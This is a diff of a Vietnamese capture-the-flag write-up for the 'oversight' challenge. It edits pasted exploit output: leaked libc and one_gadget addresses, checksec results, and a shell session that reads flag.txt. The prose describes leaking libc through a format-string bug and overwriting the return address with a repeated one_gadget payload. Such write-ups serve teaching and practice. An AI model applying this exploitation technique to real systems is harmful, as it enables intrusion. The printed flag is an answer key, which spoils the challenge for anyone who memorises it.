@@ -108,8 +108,8 @@ oversight: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically l
 - Ta sẽ dùng bug fmt để leak libc và tính base và tính one_gadget. Sau đó control ret về one_gadget.
     
     ```python
-    [*] libc: 0x7ffff79e2000
-    [*] one_gadget: 0x7ffff7a313d5
+    [*] base: 0x7f7cfd5d7000
+    [*] one_gadget: 0x7f7cfd6263d5
     ```
     
 - Tiếp đến ta cần control ret sau khi debug thì mình thấy bug ở get_num_bytes() nếu ta nhập size 256 và nhập "a"*256 thì ở leave ta thấy như sau.
@@ -124,15 +124,15 @@ oversight: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically l
 - Ta có thể control được ret nhưng ret có thể nhảy các ô stack nên khó xác định vì thể mính để luôn payload là p64(one_gadget)*32 thì thế nào cũng ret về one_gadget cho mình.
 
 ```python
-Arch:     amd64-64-little
+    Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      PIE enabled
-[*] libc: 0x7f546a610000
-[*] one_gadget: 0x7f546a65f3d5
+[*] base: 0x7f7cfd5d7000
+[*] one_gadget: 0x7f7cfd6263d5
 [*] Switching to interactive mode
 You said:
-ejT\x7f$  cat flag.txt
+cb|$cat flag.txt
 DUCTF{1_sm@LL_0ver5ight=0v3rFLOW}
 ```
